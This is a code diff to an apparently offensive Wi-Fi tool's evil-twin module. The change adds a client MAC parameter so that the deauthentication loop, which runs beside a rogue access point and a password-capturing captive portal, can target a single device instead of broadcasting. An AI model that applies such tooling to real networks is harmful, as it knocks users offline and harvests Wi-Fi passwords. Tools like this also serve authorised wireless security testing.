@@ -27,6 +27,7 @@ from dataclasses import dataclass
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import parse_qs
 
+from ..frames import BROADCAST
 from .deauth import deauth as _deauth
 
 # ── constants ────────────────────────────────────────────────────────────────
@@ -226,6 +227,7 @@ def run_eviltwin(
     bssid: str,
     ssid: str,
     channel: int,
+    client: str = BROADCAST,
     timeout: float = 120.0,
     stop_event: threading.Event | None = None,
     progress_fn=None,
@@ -238,6 +240,11 @@ def run_eviltwin(
         bssid:     Real AP's BSSID — used only for deauth targeting.
         ssid:      Target network name — shown on the portal and broadcast.
         channel:   Channel for the rogue AP (2.4GHz preferred; clamped to 1-13).
+        client:    MAC to target the deauth loop at (2026-08-30: was always
+            BROADCAST here regardless of caller — see the same fix in
+            gui/attack_runner.py's pincer()/eviltwin() and gui/app.py's
+            _auto_deauth_run()). Defaults to BROADCAST when the caller has no
+            discovered client to target, same as deauth()'s own default.
         timeout:   Seconds before giving up if no password submitted.
         stop_event: Set externally to abort early.
         progress_fn: Optional callback for live per-step status (hostapd/
@@ -334,7 +341,7 @@ def run_eviltwin(
             while not stop.is_set() and not result_box:
                 round_n += 1
                 try:
-                    sent = _deauth(iface_mon, bssid, channel=channel, progress_fn=log)
+                    sent = _deauth(iface_mon, bssid, client=client, channel=channel, progress_fn=log)
                     if sent == 0:
                         log(f"eviltwin deauth round {round_n}: did NOT go out to {bssid} — see the warning above")
                     else:
